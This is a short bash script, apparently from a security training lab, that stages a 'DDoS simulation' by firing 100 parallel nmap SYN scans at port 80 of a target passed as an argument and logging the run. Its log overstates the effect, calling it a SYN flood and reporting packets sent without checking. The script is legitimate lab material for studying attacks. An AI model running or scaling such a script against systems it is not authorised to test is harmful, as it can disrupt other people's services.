#!/bin/bash
# DDoS attack simulation script
set -euo pipefail

TARGET="$1"
TIMESTAMP=$(date +%Y%m%d-%H%M%S)
ARTIFACTS_PATH="${ARTIFACTS_PATH:-/workspaces/cns/artifacts}"
OUTPUT_FILE="${ARTIFACTS_PATH}/ddos-${TARGET}-${TIMESTAMP}.log"

echo "Starting DDoS simulation against $TARGET" | tee "$OUTPUT_FILE"
echo "Simulation Type: SYN flood simulation" | tee -a "$OUTPUT_FILE"
echo "Duration: 10 seconds" | tee -a "$OUTPUT_FILE"
echo "Target: $TARGET:80" | tee -a "$OUTPUT_FILE"
echo "" | tee -a "$OUTPUT_FILE"

# Simulate DDoS using nmap's timing and parallelization features
# This creates multiple rapid connections to simulate traffic load
echo "[$(date)] Starting simulated attack..." | tee -a "$OUTPUT_FILE"

for i in {1..100}; do
    # Send multiple SYN packets using nmap
    timeout 0.1 nmap -sS -p 80 -Pn --max-retries 0 --host-timeout 100ms "$TARGET" &>/dev/null &
done 2>&1 | tee -a "$OUTPUT_FILE"

# Wait a bit for packets to be sent
sleep 10

echo "" | tee -a "$OUTPUT_FILE"
echo "[$(date)] Simulation completed" | tee -a "$OUTPUT_FILE"
echo "Status: ~100 connection attempts sent" | tee -a "$OUTPUT_FILE"
echo "Protocol: TCP SYN to port 80" | tee -a "$OUTPUT_FILE"
echo "" | tee -a "$OUTPUT_FILE"
echo "NOTE: This is a SIMULATED attack for lab/training purposes only" | tee -a "$OUTPUT_FILE"
echo "ARTIFACT: $OUTPUT_FILE"

exit 0